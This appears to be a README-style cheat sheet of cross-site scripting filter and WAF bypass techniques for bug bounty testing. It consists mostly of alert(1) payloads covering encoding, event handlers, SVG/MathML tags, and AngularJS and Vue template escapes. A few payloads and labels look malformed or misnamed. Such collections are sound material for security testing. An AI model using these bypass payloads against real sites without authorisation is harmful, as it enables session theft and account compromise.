# Advanced Cross-Site Scripting (XSS) Bypass Techniques

> **Mastering Filters, WAFs, and Real-World Exploitation**

---

## 📘 Introduction

Cross-Site Scripting (XSS) remains one of the most prevalent and dangerous vulnerabilities in modern web applications. Despite improvements in input sanitization, CSP headers, and WAFs, attackers consistently find creative ways to bypass restrictions and execute scripts. This document presents a deep-dive into advanced XSS bypass techniques, grounded in real-world bug bounty cases and research.

---

## 🧭 Table of Contents

1. [Introduction](#-introduction)
2. [Types of XSS Filters](#-types-of-xss-filters)
3. [Encoding-Based Bypasses](#-encoding-based-bypasses)
4. [Event Handler & DOM Tricks](#-event-handler--dom-tricks)
5. [HTML5 Abuse & Weird Tags](#-html5-abuse--weird-tags)
6. [JavaScript Context Escapes](#-javascript-context-escapes)
7. [WAF Bypass Techniques](#-waf-bypass-techniques)
8. [Framework-Specific Payloads](#-framework-specific-payloads)
9. [CSP Misconfigurations](#-csp-misconfigurations)
10. [Advanced Obfuscation Techniques](#-advanced-obfuscation-techniques)
11. [Case Studies from Bug Bounties](#-case-studies-from-bug-bounties)
12. [Tools for Testing & Automation](#-tools-for-testing--automation)
13. [Payload Repository](#-payload-repository)
14. [Final Notes](#-final-notes)
15. [References](#-references)

---

## 🔐 Types of XSS Filters

* Input Filters (client-side / server-side)
* Output Filters (context-based)
* HTML Sanitizers (DOMPurify, xss-filters)
* WAFs (Cloudflare, Akamai, AWS WAF)

---

## 🧬 Encoding-Based Bypasses

```html
<script><script\x3Ealert(1)</script>
<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

---

## 🧠 Event Handler & DOM Tricks

```html
<div onpointerover="alert(1)">Hover me</div>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">Click me</a>
```

---

## 🧪 HTML5 Abuse & Weird Tags

```html
<svg><script>alert(1)</script></svg>
<math><mi//xlink:href="javascript:alert(1)"></math>
<details open ontoggle=alert(1)>
```

---

## 🧩 JavaScript Context Escapes

```js
var data = "<input value='" + user + "'>";
// Payload: ' onfocus=alert(1) autofocus='

JSON.parse('{"user":"<img src=x onerror=alert(1)>"}')
```

---

## 🧱 WAF Bypass Techniques

* Double Encoding:

```html
<script%20%0a>alert(1)</script>
```

* Tag Confusion:

```html
<<script>script>alert(1)</script>
```

* Mixed Context Injection
* Non-Standard Quotes, Spaces, Comments

---

## ⚙️ Framework-Specific Payloads

### AngularJS

```html
{{constructor.constructor('alert(1)')()}}
```

### React

Escape JSX via `dangerouslySetInnerHTML`

### Vue.js

```html
{{['a'].pop().constructor('alert(1)')()}}
```

---

## 🛡️ CSP Misconfigurations

* Open `script-src` or `unsafe-inline`
* Trusted `data:` URIs
* Using `script` inside SVG or iframe

---

## 🌀 Advanced Obfuscation Techniques

```html
<script><!--alert(1)//--></script>
<script>eval("al"+"ert(1)")</script>
<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>
```

---

## 🧾 Case Studies from Bug Bounties

✔️ **Case #17 (2024)**: Bypassed client-side regex using `<svg><script xlink:href="data:text/javascript,alert(1)"></script>`
✔️ **Private Program (2025)**: AngularJS sandbox escape using `{{constructor.constructor('alert(1)')()}}`

---

## 🧪 Tools for Testing & Automation

* [XSStrike](https://github.com/s0md3v/XSStrike)
* [Dalfox](https://github.com/hahwul/dalfox)
* [BugHunter](https://github.com/erohack/bughunter) *(by EroHack)*
* Custom Payload Generators

---

## 💣 Payload Repository

```
payloads/
├── waf-bypass.txt
├── dom-based.txt
├── unicode-encodings.txt
├── framework-specific/
│   ├── angular.txt
│   ├── react.txt
│   └── vue.txt
└── csp-bypass.txt
```

---

## 🧾 Final Notes

* Always test across browsers.
* CSP headers are not always reliable.
* Validate both reflection and execution.
* Automate with caution — manual inspection is key.

---

## 🔗 References

* [OWASP XSS Cheat Sheet](https://owasp.org/www-community/xss)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [PortSwigger XSS Bypasses](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [HackerOne Writeups](https://hackerone.com/hacktivity)

---

**Author:** [Shayan from EroHack](https://github.com/erohack)
**License:** MIT
**Last Update:** July 2025
